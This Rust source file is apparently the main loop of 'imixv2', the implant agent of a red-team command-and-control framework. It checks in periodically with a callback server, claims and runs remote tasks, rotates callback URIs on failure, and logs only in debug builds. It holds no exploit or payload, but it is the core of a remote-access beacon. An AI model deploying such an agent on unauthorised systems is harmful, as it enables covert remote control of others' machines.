use anyhow::Result;
use std::sync::Arc;
use std::sync::atomic::{AtomicBool, Ordering};
use std::time::{Duration, Instant};

use crate::agent::ImixAgent;
use crate::task::TaskRegistry;
use crate::version::VERSION;
use eldritchv2::pivot::ReplHandler;
use pb::config::Config;
use transport::{ActiveTransport, Transport};

pub static SHUTDOWN: AtomicBool = AtomicBool::new(false);

pub async fn run_agent() -> Result<()> {
    init_logger();
    let config = Config::default_with_imix_verison(VERSION);
    let transport = ActiveTransport::init();
    let handle = tokio::runtime::Handle::current();
    let task_registry = Arc::new(TaskRegistry::new());
    let agent = Arc::new(ImixAgent::new(config, transport, handle, task_registry.clone()));

    #[cfg(debug_assertions)]
    log::info!("Agent initialized");

    while !SHUTDOWN.load(Ordering::Relaxed) {
        let start = Instant::now();
        let agent_ref = agent.clone();
        let registry_ref = task_registry.clone();
        run_agent_cycle(agent_ref, registry_ref).await;
        if SHUTDOWN.load(Ordering::Relaxed) { break; }
        if let Err(e) = sleep_until_next_cycle(&agent, start).await {
            #[cfg(debug_assertions)]
            log::error!("Failed to sleep: {e:#}");
            tokio::time::sleep(Duration::from_secs(5)).await;
        }
    }
    #[cfg(debug_assertions)]
    log::info!("Agent shutting down");
    Ok(())
}

pub fn init_logger() {
    #[cfg(debug_assertions)]
    {
        use pretty_env_logger;
        let _ = pretty_env_logger::formatted_timed_builder().filter_level(log::LevelFilter::Info).parse_env("IMIX_LOG").try_init();
        log::info!("Starting imixv2 agent");
    }
}

async fn run_agent_cycle(agent: Arc<ImixAgent<ActiveTransport>>, registry: Arc<TaskRegistry>) {
    agent.refresh_ip().await;
    let (callback_uri, proxy_uri) = agent.get_transport_config().await;
    let transport = match ActiveTransport::new(callback_uri, proxy_uri) {
        Ok(t) => t,
        Err(_e) => {
            #[cfg(debug_assertions)]
            log::error!("Failed to create transport: {_e:#}");
            agent.rotate_callback_uri().await;
            return;
        }
    };
    agent.update_transport(transport).await;
    process_tasks(&agent, &registry).await;
    agent.flush_outputs().await;
    agent.update_transport(ActiveTransport::init()).await;
}

async fn process_tasks(agent: &ImixAgent<ActiveTransport>, registry: &TaskRegistry) {
    match agent.claim_tasks().await {
        Ok(tasks) => {
            if tasks.is_empty() {
                #[cfg(debug_assertions)]
                log::info!("Callback success, no tasks to claim");
                return;
            }
            for task in tasks {
                #[cfg(debug_assertions)]
                log::info!("Claimed task: {}", task.id);
                let sync_transport = agent.get_sync_transport();
                let repl_handler: Option<Arc<dyn ReplHandler>> = Some(Arc::new(agent.clone()));
                registry.spawn(task, Arc::new(agent.clone()), sync_transport, repl_handler);
            }
        }
        Err(_e) => {
            #[cfg(debug_assertions)]
            log::error!("Callback failed: {_e:#}");
            agent.rotate_callback_uri().await;
        }
    }
}

async fn sleep_until_next_cycle(agent: &ImixAgent<ActiveTransport>, start: Instant) -> Result<()> {
    let interval = agent.get_callback_interval_u64()?;
    let delay = match interval.checked_sub(start.elapsed().as_secs()) {
        Some(secs) => Duration::from_secs(secs),
        None => Duration::from_secs(0),
    };
    #[cfg(debug_assertions)]
    log::info!("Callback complete (duration={}s, sleep={}s)", start.elapsed().as_secs(), delay.as_secs());
    tokio::time::sleep(delay).await;
    Ok(())
}
